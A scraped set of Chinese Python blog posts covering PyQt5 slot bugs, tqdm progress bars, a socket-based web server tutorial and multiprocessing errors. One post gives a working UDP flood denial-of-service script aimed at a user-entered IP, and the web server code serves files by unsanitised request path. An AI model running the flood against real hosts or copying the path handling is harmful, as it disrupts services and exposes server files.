PyQt5 GUI 程序时，定义了一个槽函数，在实际触发过程中会两次触发该槽函数，例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import sys from PyQt5.QtCore import pyqtSlot from PyQt5.QtWidgets import QApplication, QMainWindow from mainwindow import Ui_MainWindow class QmyMainWindow(QMainWindow): def __init__(self, parent=None): super().__init__(parent=parent) self.ui = Ui_MainWindow() self.ui.setupUi(self) def on_action_triggered(self): print(\u0026#39;triggered\u0026#39;) def on_pushButton_clicked(self): print(\u0026#39;clicked\u0026#39;) def on_pushButton_pressed(self): print(\u0026#39;pressed\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: app = QApplication(sys.argv) form = QmyMainWindow() form.show() sys.exit(app.exec_()) 上面得例子中，无论是点击 pushButton 还是说点击 action ，结果都是会进行两次打印，但是点击 pushButton_2 时却只会触发一次槽函数。\n出现原因 经过测试发现，会两次触发的都是拥有同名函数的槽函数，例如：clicked 和 triggered。由于该槽函数拥有两种信号，一种带参数一种不带参数。当不对槽函数进行限制时，不带参数的槽函数就会以为有两个信号，因此会触发两次。\n解决办法 对槽函数参数加上限制后，不带参数的槽函数只会接收不带参数的槽函数信号，则槽函数只会触发一次。\n修改后代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import sys from PyQt5.QtCore import pyqtSlot from PyQt5.QtWidgets import QApplication, QMainWindow from mainwindow import Ui_MainWindow class QmyMainWindow(QMainWindow): def __init__(self, parent=None): super().__init__(parent=parent) self.ui = Ui_MainWindow() self.ui.setupUi(self) @pyqtSlot() def on_action_triggered(self): print(\u0026#39;triggered\u0026#39;) @pyqtSlot() def on_pushButton_clicked(self): print(\u0026#39;clicked\u0026#39;) def on_pushButton_2_pressed(self): print(\u0026#39;pressed\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: app = QApplication(sys.argv) form = QmyMainWindow() form.show() sys.exit(app.exec_()) 查看 pyqtSlot 的官方文档：链接\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pyqt5-%E7%82%B9%E5%87%BB%E4%BC%9A%E8%A7%A6%E5%8F%91%E4%B8%A4%E6%AC%A1%E6%A7%BD%E5%87%BD%E6%95%B0/","title":"PyQt5 点击会触发两次槽函数"},{"content":"PyQt5 使用多个槽函数时程序卡死 问题 利用 PyQt5 制作窗体时，使用多个槽函数时程序出现卡死\n异常信息 1 TypeError: on_chkBoxBold_clicked() missing 1 required positional argument: \u0026#39;checked\u0026#39; 原因 有两个不同类型参数的 clicked 信号时，connectSlotsByName() 函数进行信号与槽函数关联时会使用一个默认的信号。 这对于 QCheckBox 来说，默认使用的是不带参数的 clicked() 信号。但是 on_chkBoxBold_clicked() 是需要接收一个参数作布尔判断的，因此会出现上述错误。\n解决办法 使用 @pyqtSlot 装饰器，这个装饰器会声明函数的参数类型，这样 connectSlotsByName()函数 就会自动和 clicked(bool) 信号关联，运行时就不会出现问题了。\n代码 1 2 3 4 5 from PyQt5.QtCore import pyqtSlo @pyqtSlot(bool) def on_checkBoxBold_clicked(checked): pass ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pyqt5-%E4%BD%BF%E7%94%A8%E5%A4%9A%E4%B8%AA%E6%A7%BD%E5%87%BD%E6%95%B0%E6%97%B6%E7%A8%8B%E5%BA%8F%E5%8D%A1%E6%AD%BB/","title":"PyQt5 使用多个槽函数时程序卡死"},{"content":"PyQt5——创建自己的第一个 GUI 程序 一、Qt 1. 关于Qt Qt 是一个1991年由Qt Company开发的跨平台C++图形用户界面应用程序开发框架。它既可以开发GUI程序，也可用于开发非GUI程序，比如控制台工具和服务器。\nQt 的许可证分为商业许可和开源许可，开源许可的 Qt 就已经包含非常丰富的功能模块，足够我们学习使用。 点击进入：Qt 官方网站\n2. 关于 PyQt5 PyQt 是Qt C++ 类库的 Python 绑定，PyQt5 对应 Qt5 类库。Qt 发行新版本后，PyQt5就会推出跟进的新版本。\n使用 PyQt5 可以充分利用 Qt 的应用程序开发框架和功能丰富的类设计 GUI 程序。\n安装 PyQt5 库: pip install PyQt5 正确执行该命令后 Python 就会安装好 PyQt5 ，并且会自动安装依赖的 SIP 包（SIP 包是一个将 C/C++ 库转换为 Python 绑定的工具）。\n安装完成后，在 Python 安装目录下的 D:\\Python\\Scripts\\ 文件夹内会增加 pylupdate5.exe、pyrcc5.exe和pyuic5.exe 这三个可执行文件，这三个可执行文件的作用分别如下：\npyuic5.exe：将Qt Designer生成的可视化设计的界面文件(.ui文件)文件编译转换为 Python 程序文件(.py文件) pyrcc5.exe：将Qt Creator里设计的资源文件(.qrc文件)编译转换为 Python 程序文件(.py文件) pylupdate5.exe：这是多语言界面设计时编辑语言资源文件的工具软件 因为\u0026quot;D:\\Python\\Scripts\u0026quot; 目录被添加到了 PATH环境变量 中，因此这三个可执行文件可以直接在 cmd 中运行。 PyQt5 参考手册：链接\n二、第一个 PyQt5 GUI 程序 话不多说，先上代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import sys import time from PyQt5 import QtCore, QtGui, QtWidgets app = QtWidgets.QApplication(sys.argv) # 创建app, 用QApplication类 widgetHello = QtWidgets.QWidget() # 创建窗体, 用QWidget类 widgetHello.resize(500, 150) # 设置窗体的宽度和高度 widgetHello.setWindowTitle(\u0026#39;Demo2_1\u0026#39;) # 设置窗体的标题文字 LabHello = QtWidgets.QLabel(widgetHello) # 创建标签, 父容器为widgetHello LabHello.setText(\u0026#39;Hello World, PyQt5!\u0026#39;) # 设置标签文字 font = QtGui.QFont() # 使用QFont类创建字体对象font font.setPointSize(12) # 设置字体大小 font.setBold(True) # 设置为粗体 LabHello.setFont(font) # 设置为标签LabHello的字体 size = LabHello.sizeHint() # 获取LabHello的合适大小, 得到一个size对象 LabHello.setGeometry(70, 60, size.width(), size.height()) widgetHello.show() # 显示对话框 sys.exit(app.exec_()) # 运行程序 观察程序，我们可以发现创建的这个 PyQt5 的 GUI 程序，经历了以下几个步骤：\n导入 PyQt5 的相应模块 使用 QApplication类 创建了一个应用程序（QApplication是管理 GUI 应用程序的控制流程和设置的类） 使用 QWidget类 创建了一个窗体对象 widgetHello。然后使用 resize() 方法更改窗体大小，调用 setWindowTitle() 方法 设置窗体标题（这两步都不是必须的） 使用 QLable类 创建了一个标签对象，并将 widgetHello 对象传递给 QLabel 构造函数。这一步实际上是指定 widgeHello 成为 LabHello 的父容器，这样 LabHello 才能够显示在 widgetHello 上。后面使用 QLabel 对 Label 进行相应属性设置 最后就开始显示窗体（即最后两行代码） 至此，我们就已经创建好一个 PyQt5 的 GUI 程序了！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pyqt5%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AAgui-%E7%A8%8B%E5%BA%8F/","title":"PyQt5——创建自己的第一个GUI 程序"},{"content":"Python 动态显示任务进度 一、print函数实现 flush参数： 在print函数的所有参数中，有一个关键字参数叫flush，这个参数为True时会将缓冲区的内容直接性输出。\n\\r转义字符： 转义字符\\r会每次回到开头 我们可以巧妙利用flush参数和转义字符\u0026quot;\\r\u0026quot;实现进度显示：\n1 2 for i in range(101): print(\u0026#34;%d%\u0026#34;%i, end=\u0026#34;\u0026#34;, flush=True) 这样我们就可以实现从进度的展示了 二、tqdm模块 tqdm是 Python 进度条库，可以在 Python 长循环中添加一个进度提示信息用法：tqdm(iterator)。\n安装 tqdm不是Python的官方自带库，需要用户自行安装。我们可以通过pip进行安装tqdm库：\n1 pip install tqdm 使用 1. 进度条显示 tqdm()中需要传递一个可迭代对象； trange()是对range()函数的封装，相当于tqdm(range())，效果和上面相同\n1 2 3 4 5 6 7 8 import time from tqdm import tqdm for i in tqdm(range(10)): time.sleep(1) 效果： 100%|██████████| 10/10 [00:10\u0026lt;00:00, 1.00s/it] 2. 进度条设置描述 1 2 3 4 5 6 7 8 9 10 11 import time from tqdm import tqdm pbar = tqdm([\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;d\u0026#34;]) for char in pbar: # 设置描述 pbar.set_description(\u0026#34;Processing\u0026#34;) time.sleep(1) 效果： Processing: 100%|██████████| 4/4 [00:04\u0026lt;00:00, 1.00s/it] 3. 手动设置更新 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import time from tqdm import tqdm # 总数100，每次更新5，一共更新20次 # 方法一： with tqdm(total=100) as pbar: for i in range(20): pbar.update(5) time.sleep(1) #方法二： pbar = tqdm(total=200) for i in range(20): pbar.update(5) time.sleep(1) pbar.close() 效果： 100%|██████████| 100/100 [00:20\u0026lt;00:00, 5.00it/s] ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E5%8A%A8%E6%80%81%E6%98%BE%E7%A4%BA%E4%BB%BB%E5%8A%A1%E8%BF%9B%E5%BA%A6/","title":"Python 动态显示任务进度"},{"content":"Python 构建 Web 服务器 1.0 一、Web服务器简介 当我们在访问网站时，实际上就是向对应网站的Web服务器发出了请求，Web服务器监听到请求后就会向我们返回相对于的资源。Web服务器实际上就是一个接收网络请求，处理网络请求的应用程序。\n市面上常见的Web服务器有：Apache、 Nginx 、IIS 等。\n作为一个 Web 开发人员，理解 Web 服务器的工作流程对于我们而言是有好处的，正所谓 “知己知彼，百战不殆” 。在接下来的教程中我们将使用 Python 语言构建一个简易的 Web 服务器， 以此来深入理解 Web 服务器的工作原理。\n二、HTTP简介 HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。\nHTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。\nWeb 页面就是主要通过 HTTP 协议进行传输，Web 服务器需要能够解析 HTTP 协议。\nHTTP 通过 TCP 协议进行传输，下面来看一个 HTTP 协议的请求数据包：\n请求数据包：\n1 2 3 4 5 6 7 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive 响应数据包：\n1 2 3 4 HTTP/1.1 200 OK Content-Type: text/html \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; 我们的 Web 服务器就需要通过 HTTP 协议与浏览器进行交互。\n更多关于 HTTP 协议的信息大家可以自行学习。\n三、Web服务器1.0 想要进行网络通信，首先要建立网络连接。而 socket 就是用来建立网络连接的，建立一个 socket 则代表一个网络连接。更多关于 socket 的基础知识大家可以进行资料的查阅。\nPython 语言中，socket 是作为一个内置库，可以直接进行导入。\n首先进行创建套接字并监听网络请求：\n1 2 3 4 5 6 7 8 9 10 11 # 导入 socket 库 import socket # 创建 socket 对象 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 绑定 IP 和端口 sock.bind((\u0026#39;127.0.0.1\u0026#39;, 8000)) # 监听客户端请求 sock.listen(1) print(\u0026#34;服务器正在监听...\u0026#34;) 当客户端对服务器进行访问后，我们就需要接收客户端的请求并进行处理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 建立 socket 连接 client, addr = sock.accept() print(\u0026#34;客户端信息：\u0026#34;, addr) data = b\u0026#39;\u0026#39; while True: # 接收来自客户端的信息 chunk = client.recv(1024) # 拼接字符串 data += chunk # 判断信息是否接收完成 if len(chunk) \u0026lt; 1024: break print(\u0026#34;收到的信息：\u0026#34;, data) 现阶段我们对客户端的请求返回统一的结果：\n1 2 3 4 5 6 # 向客户端返回数据 client.sendall(b\u0026#39;HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt;\u0026#39;) # 关闭客户端 client.close() # 关闭 socket 连接 sock.close() 完整程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 导入 socket 库 import socket def main(): # 创建 socket 对象 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 绑定 IP 和端口 sock.bind((\u0026#39;127.0.0.1\u0026#39;, 8000)) # 监听客户端请求 sock.listen(1) print(\u0026#34;服务器正在监听...\u0026#34;) # 建立 socket 连接 client, addr = sock.accept() print(\u0026#34;客户端信息：\u0026#34;, addr) data = b\u0026#39;\u0026#39; while True: # 接收来自客户端的信息 chunk = client.recv(1024) data += chunk if len(chunk) \u0026lt; 1024: break print(\u0026#34;收到的信息：\u0026#34;, data) # 向客户端返回数据 client.sendall(b\u0026#39;HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt;\u0026#39;) # 关闭客户端 client.close() # 关闭 socket 连接 sock.close() if __name__ == \u0026#39;__main__\u0026#39;: main() 运行程序，打开浏览器，输入地址：http://127.0.0.1:8000/。\n浏览器出现以下信息则代表我们的 Web 服务器运行成功：\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E6%9E%84%E5%BB%BA-web-%E6%9C%8D%E5%8A%A1%E5%99%A8-1.0/","title":"Python 构建 Web 服务器 1.0"},{"content":"Python 构建 Web 服务器 2.0 1. 简介 在上一节中，我们使用 socket 构建了一个可以被浏览器访问的 Web 服务器。但是我们构建的 Web 服务器客户端连接一次后就结束程序了，并且这个 Web 服务器同时只允许一个客户端进行连接。\n本节会对上一次的 Web 服务器进行优化，使其能够持续运行并且能够支持多用户同时连接！\n2. 持续运行 在实际开发中，Web 服务器是 24 小时持续运行的，想要实现这个效果我们可以使用 while 循环达到。\n我们将与客户端建立连接部分的代码放入 while 循环中，这样我们就可以多次和服务器建立连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import socket def main(): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 端口复用 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((\u0026#39;127.0.0.1\u0026#39;, 8000)) sock.listen(5) print(\u0026#34;服务器正在进行监听...\u0026#34;) while True: client, addr = sock.accept() print(\u0026#34;客户端信息：\u0026#34;, addr) # 获取客户端请求 data = b\u0026#39;\u0026#39; while True: chunk = client.recv(1024) data += chunk if len(chunk) \u0026lt; 1024: break print(\u0026#34;客户端发送的数据：\u0026#34;, data) # 给客户端返回响应 client.sendall(b\u0026#39;HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt;\u0026#39;) print(\u0026#34;*\u0026#34; * 100) client.close() if __name__ == \u0026#39;__main__\u0026#39;: main() 打开浏览器，访问：http://127.0.0.1:8000，出现 “Hello World” 字样。多次访问地址，能够实现多次访问。\n三、多用户同时连接 由于我们的程序是单线程的，那么每次只能处理一个客户端的请求。在和一个客户端进行交互的过程中，无法和其他的客户端进行建立连接。\n为了同时和多个用户建立连接，我们需要使用多线程技术，为每一个客户端建立一个线程用于建立连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import socket import threading def process_connection(client): \u0026#34;\u0026#34;\u0026#34; 处理客户端连接 :param client: 客户端 :return: \u0026#34;\u0026#34;\u0026#34; # 获取客户端请求 data = b\u0026#39;\u0026#39; while True: chunk = client.recv(1024) data += chunk if len(chunk) \u0026lt; 1024: break print(\u0026#34;客户端发送的数据：\u0026#34;, data) # 给客户端返回响应 client.sendall(b\u0026#39;HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt;\u0026#39;) print(\u0026#34;*\u0026#34; * 100) client.close() def main(): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 端口复用 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((\u0026#39;127.0.0.1\u0026#39;, 8000)) sock.listen(5) print(\u0026#34;服务器正在进行监听...\u0026#34;) while True: client, addr = sock.accept() print(\u0026#34;客户端信息：\u0026#34;, addr) # 创建新的线程用户处理客户端连接 threading.Thread(target=process_connection, args=(client, )).start() if __name__ == \u0026#39;__main__\u0026#39;: main() 通过多线程技术和 while 语句我们成功让 Web 服务器能够持续运行和支持同时处理多客户端请求！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E6%9E%84%E5%BB%BA-web-%E6%9C%8D%E5%8A%A1%E5%99%A8-2.0/","title":"Python 构建 Web 服务器 2.0"},{"content":"Python 构建 Web 服务器 3.0 一、简介 在上一章中我们已经成功让 Web 服务器能够持续运行和同时支持多用户连接。但是迄今为止我们的 Web 服务器对于所有的路由都只能返回一句 “Hello World”。作为一个合格的 Web 服务器，我们需要能够支持解析路由的功能。\n那么本节，我们就将实现解析路由并返回文本资源的功能。\n二、解析路由 随意用浏览器抓包一个 HTTP 报文首部进行观察：\n1 2 3 4 5 6 7 GET / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive 发现浏览器，请求的资源路径所在位置为报文首行。那么我们使用只需要将这个路径提取出来就知道客户端需要的资源是什么了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def parse_path(data): \u0026#34;\u0026#34;\u0026#34; 从 HTTP 报文中提取资源路径 :param data: :return: \u0026#34;\u0026#34;\u0026#34; # 将二进制报文转换为字符串 tmp = data.decode() # 获取请求首行数据 tmp = tmp.split(\u0026#34;\\r\\n\u0026#34;) # 获取请求路径 path = tmp[0].split() # 返回资源请求路径 return path[1] 三、提取资源 首先我们在服务端程序所在同级目录下创建 resource 文件夹，在 resource 文件夹下创建 index.html 文件，并输入以下代码：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Hello\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这个 index.html 文件就是我们准备请求的资源了。\n现在我们通过第二步找到的路径提取资源：\n1 2 3 4 5 6 7 8 9 10 def get_resource(path): \u0026#34;\u0026#34;\u0026#34; 提取资源的内容 :param path: 资源路径 :return: 资源内容 \u0026#34;\u0026#34;\u0026#34; with open(path, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.read() return data 四、404 页面 注意，这里有一个问题：客户端请求的资源并不总是存在的！\n当客户端请求一个不存在的资源时，我们应该返回 404 状态码和 404 页面以此来提示用户：\n在 resource 文件夹下新建 404.html 文件，写入以下代码：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;404\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Resource Not Found\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 修改我们的 Python 代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def get_resource(path): \u0026#34;\u0026#34;\u0026#34; 提取资源的内容 :param path: 资源路径 :return: 状态码，资源内容 \u0026#34;\u0026#34;\u0026#34; RESOURCE = \u0026#34;resource\u0026#34; data_404 = RESOURCE + \u0026#34;/404.html\u0026#34; path = RESOURCE + path # 判断资源是否存在 if os.path.exists(path): # 存在则提取资源并设置状态码为 200 with open(path, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.read() status = 200 else: # 不存在则返回 404 页面并设置状态码为 404 with open(data_404, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.read() status = 404 return status, data 五、报文封装 资源内容提取后，下一步我们需要将它封装到 HTTP 报文中：\n1 2 3 4 5 6 7 8 9 def package_message(status, text): \u0026#34;\u0026#34;\u0026#34; HTTP 报文封装 :param status: 状态码 :param text: 内容 :return: HTTP 报文 \u0026#34;\u0026#34;\u0026#34; message = f\u0026#39;HTTP/1.1 {status} OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{text}\u0026#39; return message.encode(\u0026#34;utf-8\u0026#34;) 接下来只要像之前一样将 HTTP 报文发送给服务端就可以了。\n六、完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 import socket import threading import os def process_connection(client): \u0026#34;\u0026#34;\u0026#34; 处理客户端连接 :param client: 客户端 :return: \u0026#34;\u0026#34;\u0026#34; # 获取客户端请求 data = b\u0026#39;\u0026#39; while True: chunk = client.recv(1024) data += chunk if len(chunk) \u0026lt; 1024: break path = parse_path(data) status, text = get_resource(path) # 给客户端返回响应 message = package_message(status, text) client.sendall(message) print(\u0026#34;*\u0026#34; * 100) client.close() def package_message(status, text): \u0026#34;\u0026#34;\u0026#34; HTTP 报文封装 :param status: 状态码 :param text: 内容 :return: HTTP 报文 \u0026#34;\u0026#34;\u0026#34; message = f\u0026#39;HTTP/1.1 {status} OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{text}\u0026#39; return message.encode(\u0026#34;utf-8\u0026#34;) def parse_path(data): \u0026#34;\u0026#34;\u0026#34; 从 HTTP 报文中提取资源路径 :param data: 报文数据 :return: 资源路径 \u0026#34;\u0026#34;\u0026#34; # 将二进制报文转换为字符串 tmp = data.decode() # 获取请求首行数据 tmp = tmp.split(\u0026#34;\\r\\n\u0026#34;) # 获取请求路径 path = tmp[0].split() # 返回资源请求路径 return path[1] def get_resource(path): \u0026#34;\u0026#34;\u0026#34; 提取资源的内容 :param path: 资源路径 :return: 状态码，资源内容 \u0026#34;\u0026#34;\u0026#34; RESOURCE = \u0026#34;resource\u0026#34; data_404 = RESOURCE + \u0026#34;/404.html\u0026#34; path = RESOURCE + path # 判断资源是否存在 if os.path.exists(path): # 存在则提取资源并设置状态码为 200 with open(path, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.read() status = 200 else: # 不存在则返回 404 页面并设置状态码为 404 with open(data_404, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.read() status = 404 return status, data def main(): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 端口复用 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((\u0026#39;127.0.0.1\u0026#39;, 8000)) sock.listen(5) print(\u0026#34;服务器正在进行监听...\u0026#34;) while True: client, addr = sock.accept() print(\u0026#34;客户端信息：\u0026#34;, addr) # 创建新的线程用户处理客户端连接 threading.Thread(target=process_connection, args=(client,)).start() if __name__ == \u0026#39;__main__\u0026#39;: main() ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E6%9E%84%E5%BB%BA-web-%E6%9C%8D%E5%8A%A1%E5%99%A8-3.0/","title":"Python 构建 Web 服务器 3.0"},{"content":"Python 实现 DoS 攻击 —— UDP洪水攻击 DoS 攻击 拒绝服务攻击（denial-of-service attack，简称DoS攻击）亦称洪水攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n——维基百科\nUDP洪水攻击 UDP洪水攻击（User Datagram Protocol floods）：UDP（用户数据报协议）是一种无连接协议，当数据包通过UDP发送时，所有的数据包在发送和接收时不需要进行握手验证。当大量UDP数据包发送给受害系统时，可能会导致带宽饱和从而使得合法服务无法请求访问受害系统。遭受DDoS UDP洪泛攻击时，UDP数据包的目的端口可能是随机或指定的端口，受害系统将尝试处理接收到的数据包以确定本地运行的服务。如果没有应用程序在目标端口运行，受害系统将对源IP发出ICMP数据包，表明“目标端口不可达”。某些情况下，攻击者会伪造源IP地址以隐藏自己，这样从受害系统返回的数据包不会直接回到僵尸主机，而是被发送到被伪造地址的主机。有时UDP洪泛攻击也可能影响受害系统周围的网络连接，这可能导致受害系统附近的正常系统遇到问题。然而，这取决于网络体系结构和线速。\n——维基百科\n代码实现 为了达到攻击效果，我们需要向网络上的目标主机不断发送UDP请求。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from socket import * import random # 创建 socket 关键字 st = socket(AF_INET, SOCK_DGRAM) # 创建随机报文数据 bytes = random._urandom(1024) ip = input(\u0026#34;IP Target :\u0026#34;) port = 1 sent = 0 print(\u0026#34;UDP flood attack is about to begin...\u0026#34;) while True: # 发送数据 st.sendto(bytes, (ip, port)) sent += 1 port += 1 print(\u0026#34;Sent %s packet to %s throught port:%s\u0026#34; % (sent, ip, port)) if port == 65534: port = 1 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-dos-%E6%94%BB%E5%87%BB-udp%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/","title":"Python 实现 DoS 攻击 —— UDP洪水攻击"},{"content":"Python 在创建多进程时抛出 RuntimeError 错误 一、错误信息 1 2 3 4 5 6 7 8 9 10 11 RuntimeError: An attempt has been made to start a new process before the current process has finished its bootstrapping phase. This probably means that you are not using fork to start your child processes and you have forgotten to use the proper idiom in the main module: if name == ‘main‘: freeze_support() … The “freeze_support()” line can be omitted if the program is not going to be frozen to produce an executable. 二、出错代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from multiprocessing import Pool import os import time import random def test(a1): t_start = time.time() print(\u0026#34;%s 开始执行，进程号为%d\u0026#34; % (a1, os.getpid())) time.sleep(random.random() * 2) t_stop = time.time() print(\u0026#34;%s 执行完毕，耗时%.2f\u0026#34; % (a1, (t_stop - t_start))) p1 = Pool(3) for i in range(0, 10): p1.apply_async(test, args=(i,)) print(\u0026#34;-----start-----\u0026#34;) p1.close() p1.join() print(\u0026#34;------end------\u0026#34;) 三、错误原因 Python 解释器在 Windows平台 执行创建多进程的程序时，子进程会读取当前 Python 文件，用以创建进程。 在子进程读取当前文件时，读取到创建子进程的代码时又会创建新的子进程，这样程序就陷入递归创建进程的状态。 由于 Python 解释器中对于创建子进程有一个最大数量限制来保护我们的计算机（为龟叔点赞 :smile:），防止其内存溢出，因此程序会抛出异常。\n四、改正方法 将程序创建子进程的放进 if __name__ == '__main__': 语句内，该语句的作用是判断当前进程是否为主进程，是主进程才执行程序。\n五、改进后的代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from multiprocessing import Pool import os import time import random def test(a1): t_start = time.time() print(\u0026#34;%s 开始执行，进程号为%d\u0026#34; % (a1, os.getpid())) time.sleep(random.random() * 2) t_stop = time.time() print(\u0026#34;%s 执行完毕，耗时%.2f\u0026#34; % (a1, (t_stop - t_start))) if __name__==\u0026#39;__main__\u0026#39;: p1 = Pool(3) for i in range(0, 10): p1.apply_async(test, args=(i,)) print(\u0026#34;-----start-----\u0026#34;) p1.close() p1.join() print(\u0026#34;------end------\u0026#34;) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python-%E5%9C%A8%E5%88%9B%E5%BB%BA%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%97%B6%E6%8A%9B%E5%87%BAruntimeerror%E9%94%99%E8%AF%AF/","title":"Python 在创建多进程时抛出RuntimeError错误"},{"content":"Python学习之路 —— @property 原理剖析及实现 熟悉 Python 的朋友们都知道，Python 中有一个可以让方法像属性一样访问的 @property 装饰器，这个装饰器主要用来控制我们的属性。今天就带大家来解析这个装饰器。\n分析功能 首先我们应该知道它实现了怎样的功能：\n查看官方文档：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026#34;\u0026#34;\u0026#34; Property attribute. fget function to be used for getting an attribute value fset function to be used for setting an attribute value fdel function to be used for del\u0026#39;ing an attribute doc docstring Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def 